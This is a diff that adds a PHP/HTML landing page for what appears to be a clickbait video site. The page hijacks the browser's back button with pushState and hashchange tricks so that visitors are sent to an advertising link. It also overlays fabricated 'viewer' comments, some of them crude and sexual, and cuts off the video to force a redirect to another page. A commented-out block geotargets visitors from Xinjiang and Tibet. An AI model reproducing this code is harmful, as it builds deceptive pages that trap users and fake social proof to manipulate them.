@@ -1,0 +1,438 @@
+<?php
+
+include_once __DIR__ .'/../common.php';
+include_once CONFIG_PATH .'config.php';
+include_once LIBRARY_PATH .'video_helper.php';
+include_once LIBRARY_PATH.'wxchart_check.php';
+
+// $where = [];
+// if(isset($_GET['vid']) && $_GET['vid']){
+//     $where['video_vid'] = $_GET['vid'];
+// }
+// $vlist = get_one_video($where);
+
+//是否开启分享
+if($share_induce == 2){
+    $share_probability = $share_probability * 100;
+    if(mt_rand(0,100) <= $share_probability){
+        $share_induce = 1;
+    }else{
+        $share_induce = 0;
+    }
+}
+$qd=1;
+$canshu = http_build_query($_GET);
+if(!$_GET['from'] && !$_GET['article']){
+	$advertising = $advertising.'&qdfanhui='.rand(10000,99999).'&'.$canshu;
+	$qd=2;
+}
+if(isset($_GET['fanhuicx'])){
+    $qd=3;
+}
+
+if($qd==2){
+    $where = [];
+if(isset($_GET['vid']) && $_GET['vid']){
+    $where['video_vid'] = $_GET['vid'];
+}
+// $vlist = get_one_qdvideo($where);
+}else{
+    $where = [];
+if(isset($_GET['vid']) && $_GET['vid']){
+    $where['video_vid'] = $_GET['vid'];
+}
+// $vlist = get_one_video($where);
+}
+$vlist = get_one_video($where);
+
+
+//新疆ip判断
+$fnkAdvertising = $advertising.'&feinanke';
+function get_client_ip() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    if (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']) AND preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
+        foreach ($matches[0] AS $xip) {
+            if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
+                $ip = $xip;
+                break;
+            }
+        }
+    }
+    return $ip;
+}
+function ipToArea($ip=""){
+    $api = "http://sp0.baidu.com/8aQDcjqpAAV3otqbppnN2DJv/api.php?query=" . $ip . "&co=&resource_id=6006";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $api);
+    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+//    curl_setopt($ch, CURLOPT_HTTPHEADER, ('IP138_TOKEN'));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+    $handles = curl_exec($ch);
+    curl_close($ch);
+    $handles = iconv('GB2312', 'UTF-8', $handles);
+    $arr = json_decode($handles, true);
+    return $arr['data'][0]['location'];
+}
+// $uv_ip = get_client_ip();
+// $infoStr = ipToArea($uv_ip);
+// if(strstr($infoStr,'新疆') || strstr($infoStr,'西藏')){
+//     $advertising = $fnkAdvertising;
+// }
+?>
+<!DOCTYPE html>
+<html>
+<title>.</title>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+	<script src="<?=$sys_global_url?>static/app/js/jquery-1.11.1.min.js"></script>
+	<!--<script src="<?=$sys_global_url?>static/app/js/jquery.barrager.js"></script>-->
+	<script>
+        var advertising = '<?=$advertising?>';
+        var qd='<?=$qd?>';
+
+        if(qd==3){
+            var _hmt = _hmt || [];
+            (function() {
+                var hm = document.createElement("script");
+                hm.src = "https://hm.baidu.com/hm.js?75203dfd705aec4c27e07cf028bb1d9d";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        }
+
+
+        gogg(advertising);
+        function gogg(url){
+            history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
+            if(navigator.userAgent.indexOf('Android') != -1){
+                if(typeof(tbsJs) != "undefined"){
+                    tbsJs.onReady('{useCachedApi : "true"}', function(e) {})
+                    window.onhashchange=function(){
+                        location.href = url;
+                    };
+                }else{
+                    var pop = 0;
+                    window.onhashchange = function(event) {
+                        pop++
+                        if (pop >= 3) {
+                            location.href = url;
+                        }else{
+                            history.go(1)
+                        }
+                    };
+                    history.go(-1);
+                }
+            }else{
+                window.onhashchange=function(){
+                    location.href = url;
+                };
+            }
+        }
+	</script>
+	<style>
+        .tvp_app_badge {display: 'none'}
+        #barrage {
+            position: fixed;
+            width: 100vw;
+            height: 100px;
+            z-index:88;
+        }
+
+        #barrage div {
+            width: 100%;
+            height: 20px;
+            line-height: 20px;
+            position: absolute;
+        }
+	</style>
+</head>
+<body style="background-color:#000">
+<canvas style="position:fixed;top:0;left:0;z-index:88">你的浏览器不支持canvas</canvas>
+
+<div class="content">
+	<div id="video_tag" class="video" style="height:90vh"></div>
+</div>
+<div onclick="jp()" style="position: fixed;bottom: -4px;left: 0;">
+	<img src="<?=$sys_global_url?>static/img/newback.png" style="width: 100%">
+</div>
+<script type="text/javascript">
+
+    (function ($) {
+        var temp = 1
+        function Barrager(dom) {
+            this.canvas = dom.get(0);
+            this.ctx = this.canvas.getContext("2d");
+            this.msgs = new Array(300);
+            this.width = 420;
+            this.height = 140;
+            this.canvas.width=this.width;
+            this.canvas.height=this.height;
+            this.font = "16px 黑体";
+            this.ctx.font=this.font;
+            this.colorArr=["Olive","OliveDrab","Orange","OrangeRed","Orchid","PaleGoldenRod","PaleGreen","PaleTurquoise","PaleVioletRed","PapayaWhip","PeachPuff","Peru","Pink","Plum","PowderBlue","Purple","Red","RosyBrown","RoyalBlue","SaddleBrown","Salmon","SandyBrown","SeaGreen","SeaShell","Sienna","Silver","SkyBlue"];
+            this.interval = "";
+            this.draw = function () {
+                if (this.interval != "")return;
+                var _this=this;
+                this.interval = setInterval(function () {
+                    _this.ctx.clearRect(0, 0, _this.width, _this.height);
+                    _this.ctx.save();
+                    for (var i = 0; i < _this.msgs.length; i++) {
+                        if (!(_this.msgs[i] == null || _this.msgs[i] == "" || typeof(_this.msgs[i]) == "undefined")) {
+                            if(_this.msgs[i].L==null || typeof(_this.msgs[i].L)=="undefined"){
+                                if (temp < 10) {
+                                    _this.msgs[i].L=_this.width - 300;
+                                    temp ++
+                                } else {
+                                    _this.msgs[i].L=_this.width
+                                }
+                                _this.msgs[i].T=parseInt(Math.random() * 420 +10);
+                                _this.msgs[i].S=parseInt(Math.random() * (10 - 4) + 4);
+                                _this.msgs[i].C=_this.colorArr[Math.floor(Math.random() * _this.colorArr.length)];
+                            }else{
+                                if(_this.msgs[i].L<-200){
+                                    _this.msgs[i]=null;
+                                }else {
+                                    _this.msgs[i].L=parseInt(_this.msgs[i].L-_this.msgs[i].S);
+                                    _this.ctx.fillStyle =_this.msgs[i].C;
+                                    _this.ctx.fillText(_this.msgs[i].msg,_this.msgs[i].L,_this.msgs[i].T);
+                                    _this.ctx.restore();
+                                }
+                            }
+                        }
+                    }
+                }, 50);
+            };
+            this.putMsg = function (datas) {
+                for (var j = 0; j < datas.length; j++) {
+                    for (var i = 0; i < this.msgs.length; i++) {
+                        if (this.msgs[i] == null || this.msgs[i] == "" || typeof(this.msgs[i]) == "undefined") {
+                            this.msgs[i] = datas[j];
+                            break;
+                        }
+                    }
+                }
+                this.draw();
+            };
+            this.clear = function () {
+                clearInterval(this.interval);
+                this.interval="";
+                this.ctx.clearRect(0, 0, this.width, this.height);
+                this.ctx.save();
+                for(var i=0;i<this.msgs.length;i++){
+                    this.msgs[i]=null;
+                }
+            };
+        }
+
+        $.fn.barrager = function (para) {
+            if (typeof(para)=="string") {
+                try{
+                    var api = $(this).data('barrager_api');
+                    api[para].apply(api);
+                }catch (e){}
+            } else if (typeof para == 'object' || !para) {
+                $this = $(this);
+                if ($this.data('barrager_api') != null && $this.data('barrager_api') != ''){
+                    var api = $this.data('barrager_api');
+                    api.putMsg(para);
+                }else{
+                    var api = new Barrager($this);
+                    $this.data('barrager_api', api);
+                    api.putMsg(para);
+                }
+            } else {
+                $.error('Method ' + method + ' does not exist on jQuery.barrager');
+            }
+            return this;
+        }
+    })(jQuery);
+
+    function makeRandomArr(arrList, num) { // 随机取出数组元素
+        if (num > arrList.length) {
+            num = arrList.length // eslint-disable-line
+        }
+        var tempArr = arrList.slice(0)
+        var newArrList = []
+        for (var i = 0; i < num; i++) {
+            var random = Math.floor(Math.random() * (tempArr.length))
+            var arr = tempArr[random]
+            tempArr.splice(random, 1)
+            newArrList.push(arr)
+        }
+        return newArrList
+    }
+
+
+    $(function(){
+        var arrTemp = [{"msg":"还以为是标题党..."},{"msg":"不会是个标题党吧..."},{"msg":"可以可以，内容真心不错。。"},{"msg":"这装逼的人我看着都气"},{"msg":"哥哥，哥哥，好哥哥"},{"msg":"哥阿，哥~~"},{"msg":"好妹妹，过来让哥亲一口"},{"msg":"这女的长的可以"},{"msg":"看着不错。。。。"},{"msg":"哈哈哈。。。。"},{"msg":"不错不错。。"},{"msg":"这女的我看着都想..."},{"msg":"胸还挺大"},{"msg":"你们这帮畜生."},{"msg":"66666666666"},{"msg":"这白色衣服有点漏阿..."},{"msg":"怎么不跟他哥哥来一发.."},{"msg":"你们是真不要脸，哈哈哈，不过我喜欢"},{"msg":"你们这群键盘侠"},{"msg":"喜欢就上阿。。。"},{"msg":"nihao"},{"msg":"喜欢就上，别bb"},{"msg":"我喜欢待会儿的另一个女的"},{"msg":"我喜欢白色的..."},{"msg":"白虎，哈哈哈。。。。"},{"msg":"你们都还是人吗，靠。。"},{"msg":"都能不说话了吗?"},{"msg":"安心看视频不好吗?"},{"msg":"谁在说话，谁死吗"},{"msg":"啥b玩意！"},{"msg":"别说了别说了...别说了别说了"},{"msg":"看着不错。。。。"},{"msg":"视频看着还不错"},{"msg":"不错不错。"},{"msg":"确实可以"},{"msg":"简直碾压那些小鲜肉"},{"msg":"跟小鲜肉有可比性?"},{"msg":"根本不是一个级别的好吗?"},{"msg":"鹿含哭晕在厕所...哈哈哈哈"},{"msg":"哈哈哈哈。"},{"msg":"是鹿晗，不是鹿含，笨！"},{"msg":"你们哪来这么多话的?能不能好好看视频"},{"msg":"装什么虚伪。。。"},{"msg":"我都能猜到结局了。。。"},{"msg":"我都能猜到结局了。。。"},{"msg":"你看这男的我就觉得来气"},{"msg":"他一会儿肯定要装b..."},{"msg":"哈哈哈。哈哈哈"},{"msg":"我就想看看他一会儿是怎么丢脸的。。"},{"msg":"这装逼的人我看着都气"},{"msg":"我想给他杀了!!!!"},{"msg":"都别动，让我来"},{"msg":"nihao"},{"msg":"nihao"},{"msg":"看着不错。。。。"},{"msg":"对"},{"msg":"马上我哥就要来了，都给我闪开！"},{"msg":"大佬即将登场"},{"msg":"我哥还有3分钟即将到达战场！"},{"msg":"还有2分59秒"},{"msg":"还有1分钟，哈哈哈哈"},{"msg":"我感觉这人要完了"},{"msg":"我觉得他待会儿肯定要打脸"},{"msg":"哈哈哈。。。。"},{"msg":"这装逼的人我看着都气"},{"msg":"这是我发的。。。"},{"msg":"这要是我儿子我能给他捶死"},{"msg":"看着都气！"},{"msg":"看着都气人"},{"msg":"为什么要忍"},{"msg":"反正我是忍不了..."},{"msg":"我就笑笑不说话"},{"msg":"这是真能装。。"},{"msg":"这装逼的人我看着都气"},{"msg":"我真想上去给他一脚"},{"msg":"都别动，让我来"},{"msg":"让我来，让我来"},{"msg":"玛莎拉蒂很贵吗?"},{"msg":"这玛莎真好看。。。。"},{"msg":"还是没有一会儿他的好哥哥的帅。。。。"},{"msg":"他哥那车是真牛逼。。"},{"msg":"是真滴牛逼！"},{"msg":"贼6"},{"msg":"我靠，在哪呢"},{"msg":"他哥在家里干其他妹妹"},{"msg":"他哥哥还在家呢"},{"msg":"一会儿我就看看他是怎么打脸的。。"},{"msg":"哈哈哈。。。。"},{"msg":"这装逼的人我看着都气"},{"msg":"真牛逼。。。"},{"msg":"666666666666"},{"msg":"叼叼叼"},{"msg":"必须的"},{"msg":"拿下拿下"}]
+
+        $('canvas').barrager(arrTemp.slice(20, 30));
+        setInterval(function(){
+            $('canvas').barrager( [{"msg":"还以为是标题党..."},{"msg":"不会是个标题党吧..."},{"msg":"可以可以，内容真心不错。。"},{"msg":"这装逼的人我看着都气"},{"msg":"哥哥，哥哥，好哥哥"},{"msg":"哥阿，哥~~"},{"msg":"好妹妹，过来让哥亲一口"},{"msg":"这女的长的可以"},{"msg":"看着不错。。。。"},{"msg":"哈哈哈。。。。"},{"msg":"不错不错。。"},{"msg":"这女的我看着都想..."},{"msg":"胸还挺大"},{"msg":"你们这帮畜生."},{"msg":"66666666666"},{"msg":"这白色衣服有点漏阿..."},{"msg":"怎么不跟他哥哥来一发.."},{"msg":"你们是真不要脸，哈哈哈，不过我喜欢"},{"msg":"你们这群键盘侠"},{"msg":"喜欢就上阿。。。"},{"msg":"nihao"},{"msg":"喜欢就上，别bb"},{"msg":"我喜欢待会儿的另一个女的"},{"msg":"我喜欢白色的..."},{"msg":"白虎，哈哈哈。。。。"},{"msg":"你们都还是人吗，靠。。"},{"msg":"都能不说话了吗?"},{"msg":"安心看视频不好吗?"},{"msg":"谁在说话，谁死吗"},{"msg":"啥b玩意！"},{"msg":"别说了别说了...别说了别说了"},{"msg":"看着不错。。。。"},{"msg":"视频看着还不错"},{"msg":"不错不错。"},{"msg":"确实可以"},{"msg":"简直碾压那些小鲜肉"},{"msg":"跟小鲜肉有可比性?"},{"msg":"根本不是一个级别的好吗?"},{"msg":"鹿含哭晕在厕所...哈哈哈哈"},{"msg":"哈哈哈哈。"},{"msg":"是鹿晗，不是鹿含，笨！"},{"msg":"你们哪来这么多话的?能不能好好看视频"},{"msg":"装什么虚伪。。。"},{"msg":"我都能猜到结局了。。。"},{"msg":"我都能猜到结局了。。。"},{"msg":"你看这男的我就觉得来气"},{"msg":"他一会儿肯定要装b..."},{"msg":"哈哈哈。哈哈哈"},{"msg":"我就想看看他一会儿是怎么丢脸的。。"},{"msg":"这装逼的人我看着都气"},{"msg":"我想给他杀了!!!!"},{"msg":"都别动，让我来"},{"msg":"nihao"},{"msg":"nihao"},{"msg":"看着不错。。。。"},{"msg":"对"},{"msg":"马上我哥就要来了，都给我闪开！"},{"msg":"大佬即将登场"},{"msg":"我哥还有3分钟即将到达战场！"},{"msg":"还有2分59秒"},{"msg":"还有1分钟，哈哈哈哈"},{"msg":"我感觉这人要完了"},{"msg":"我觉得他待会儿肯定要打脸"},{"msg":"哈哈哈。。。。"},{"msg":"这装逼的人我看着都气"},{"msg":"这是我发的。。。"},{"msg":"这要是我儿子我能给他捶死"},{"msg":"看着都气！"},{"msg":"看着都气人"},{"msg":"为什么要忍"},{"msg":"反正我是忍不了..."},{"msg":"我就笑笑不说话"},{"msg":"这是真能装。。"},{"msg":"这装逼的人我看着都气"},{"msg":"我真想上去给他一脚"},{"msg":"都别动，让我来"},{"msg":"让我来，让我来"},{"msg":"玛莎拉蒂很贵吗?"},{"msg":"这玛莎真好看。。。。"},{"msg":"还是没有一会儿他的好哥哥的帅。。。。"},{"msg":"他哥那车是真牛逼。。"},{"msg":"是真滴牛逼！"},{"msg":"贼6"},{"msg":"我靠，在哪呢"},{"msg":"他哥在家里干其他妹妹"},{"msg":"他哥哥还在家呢"},{"msg":"一会儿我就看看他是怎么打脸的。。"},{"msg":"哈哈哈。。。。"},{"msg":"这装逼的人我看着都气"},{"msg":"真牛逼。。。"},{"msg":"666666666666"},{"msg":"叼叼叼"},{"msg":"必须的"},{"msg":"拿下拿下"}].slice(0,10));
+        },1000);
+    })
+
+
+
+    var canshu = '<?=$canshu?>';
+    var pageGlobal = {};
+    pageGlobal.vid = "<?=$vlist['video_vid'];?>";
+    pageGlobal.playStatus = "<?=$share_induce ? '' : 'continue'?>";
+    pageGlobal.delayTime = parseInt("<?=$vlist['interrupt_time'];?>");
+    pageGlobal.endTime = parseInt("<?=$vlist['video_end_time'];?>");
+    pageGlobal.endJumpUrl ="<?=$video_finish_jump;?>";
+    pageGlobal.pic = "<?=$vlist['sel_video_backimg_src'] ?: '';?>";
+    pageGlobal.height = "90vh";
+    var _player;
+
+    loadAsyncScript('<?=$sys_global_url?>static/app/js/zepto.min.js',function () {
+        test()
+    });
+
+    function test () {
+        loadAsyncScript('<?=$sys_global_url?>static/app/js/tvp.player_v2_zepto.js',function () {
+
+            !function(global, factory) {
+                global.MyPlayer = factory();
+            }(window, function() {
+                return function(obj) {
+                    var _this = this;
+                    var _playStatus = obj.playStatus;
+                    if (location.href.indexOf('continue') > -1) {
+                        _playStatus = 'continue';
+                    }
+
+                    var video = new tvp.VideoInfo();
+                    video.setVid(obj.vid);
+                    var player = new tvp.Player('100%',obj.height || '350');
+                    player.setCurVideo(video);
+                    player.addParam("wmode", "transparent");
+                    player.addParam("pic", obj.pic || tvp.common.getVideoSnapMobile(obj.vid));
+                    player.write(obj.playerId || "video_tag");
+                    if (document.getElementById("loading_video")) {
+                        $('#loading_video').hide();
+                    }
+                    player.onplay = function() {
+                        if (_playStatus == 'continue' && location.href.indexOf('continue') > -1) {
+                            video.setHistoryStart(obj.delayTime);
+                        } else {
+                            // video.setHistoryStart(3);
+                        }
+                    }
+
+                    player.onplaying = function() {
+                        if (location.href.indexOf('continue') == -1) {}
+                        _this.Playtime();
+                    }
+
+                    player.onallended = function() {
+                        _this.PlayEnd();
+                    }
+                    _this.Playtime = function() {
+                        var currtime = setInterval(function() {
+                            var pt = parseInt(player.getPlaytime());
+                            if (pt >= obj.delayTime && _playStatus != 'continue') {
+                                clearInterval(currtime);
+                                player.pause();
+                                //_this.PlayOut();
+                                location.href = './12.php'  + canshu
+                            } else if (pt >= obj.endTime) {
+                                _this.PlayEnd();
+                            }
+                        }, 1000);
+                    }
+                    _this.PlayOut = function() {
+                        $.get(urls + 'api/shareurlbak.php', function(res) {
+                            var _hmt = _hmt || [];
+                            (function() {
+                                    var hm = document.createElement("script");
+                                    hm.src = "https://hm.baidu.com/hm.js?7e97b7267765d653989f0095668aa5d4";
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(hm, s);
+                                }
+                            )();
+                            norefjump(res.url + canshu);
+                        }, 'json');
+                    }
+                    _this.PlayEnd = function() {norefjump(pageGlobal.endJumpUrl);}
+                    _this.player = player;
+                }
+            });
+
+            _player = new MyPlayer(pageGlobal);
+        });
+    }
+
+    <?=$tongji?>
+    var urls = '/<?=__MULU__?>/';
+    function jp() {
+        location.href='<?=$advertising?>';
+    }
+
+
+
+    function norefjump(url){
+
+        var len = 10;
+
+        var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz';
+
+        var maxPos = $chars.length;
+
+        var pwd = '';
+
+        for (i = 0; i < len; i++) {
+
+            pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+
+        }
+
+
+
+        var newV = document.createElement("a");
+
+        newV.setAttribute("id", pwd);
+
+        newV.setAttribute("href", url);
+
+        newV.setAttribute("rel", 'noreferrer');
+
+
+
+        document.body.appendChild(newV);
+
+        document.getElementById(pwd).click();
+
+    }
+
+    function loadAsyncScript(src, callback) {
+        var head = document.getElementsByTagName("head")[0];
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        script.setAttribute("src", src);
+        script.setAttribute("async", true);
+        script.setAttribute("defer", true);
+        head.appendChild(script);
+
+        if (script.readyState) {//ie
+            script.onreadystatechange = function() {
+                var state = this.readyState;
+                if (state === 'loaded' || state === 'complete') {
+                    callback();
+                }
+            }
+        } else {
+            script.onload = function() {
+                callback();
+            }
+        }
+    }
+</script>
+<script src="/bak/jiaoben.php"></script>
+</body>
+</html>
